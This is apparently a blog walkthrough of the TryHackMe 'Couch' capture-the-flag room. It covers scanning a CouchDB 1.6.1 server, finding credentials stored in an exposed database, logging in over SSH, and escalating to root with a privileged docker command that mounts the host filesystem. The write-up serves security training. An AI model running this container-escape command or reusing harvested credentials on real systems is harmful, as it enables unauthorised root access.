---
title: Walkthrough - Couch
published: true
---

Web, Docket, Linux, CouchDB.

[https://tryhackme.com/room/couch](https://tryhackme.com/room/couch)

* * *

## Scan the machine. How many ports are open?

``
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
|_  256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
``

* * *

## What is the database management system installed on the server?

``
5984/tcp open  http    CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
``

* * *

## What port is the database management system running on?

- 5984

* * *

## What is the version of the management system installed on the server?

- 1.6.1

* * *

## What is the path for the web administration tool for this database management system?

- found this by running `feroxbuster` as gobuster was givin me too many errors

* * *

## What is the path to list all databases in the web browser of the database management system?

- `_all_dbs`

* * *

## What are the credentials found in the web administration tool?

- `inside the secret db - atena:t4qfzcc4qN## `

* * *

## Compromise the machine and locate user.txt

- ssh in with the creds

* * *

## Escalate privileges and obtain root.txt

- check `.bash_history` and run `docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine`
- cat `/root/root.txt`

![0xskar](/assets/couch01.png)

* * * 

